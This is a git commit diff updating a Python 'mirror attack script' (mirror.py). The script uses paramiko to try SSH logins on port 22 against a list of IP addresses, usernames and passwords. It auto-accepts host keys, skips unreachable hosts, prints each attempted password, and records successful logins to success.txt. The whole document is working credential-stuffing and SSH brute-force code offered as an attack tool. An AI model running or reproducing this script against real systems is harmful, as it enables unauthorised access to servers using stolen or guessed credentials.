65b8b48a2cc402983a82f9b0457a8cce7e19657f
lightless <lightless@foxmail.com>
2017-04-09 00:14:03 +0800

    update mirror attack script

--- mirror.py
+++ mirror.py
@@ -6,6 +6,7 @@ import socket
 import datetime
 
 import paramiko
+from paramiko import ssh_exception
 
 
 if len(sys.argv) == 1:
@@ -14,14 +15,31 @@ if len(sys.argv) == 1:
 else:
     filename = sys.argv[1]
 
+no_connect_list = list()
+TIMEOUT = 15
+
 with open(filename, "r") as ff:
     for line in ff:
         line = line.strip()
-        ip, username, password = line.split("|<*>|")
+        tmp = line.split("|<*>|")
+        if len(tmp) != 3:
+            continue
+        else:
+            ip, username, password = tmp[0], tmp[1], tmp[2]
+
+        if ip in no_connect_list:
+            continue
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            ssh.connect(ip, 22, username, password, timeout=30)
+            print("Trying: {0}@{1} with {2}".format(username, ip, password))
+            ssh.connect(ip, 22, username, password, timeout=TIMEOUT)
+        except ssh_exception.NoValidConnectionsError:
+            no_connect_list.append(ip)
+            print("add a no connection ip: {0}".format(ip))
         except (paramiko.SSHException, socket.timeout):
             continue
-
+        else:
+            with open("success.txt", "a") as ss:
+                ss.write("success with: {0} {1} {2}\n".format(ip, username, password))
+            print("success with: {0} {1} {2}".format(ip, username, password))
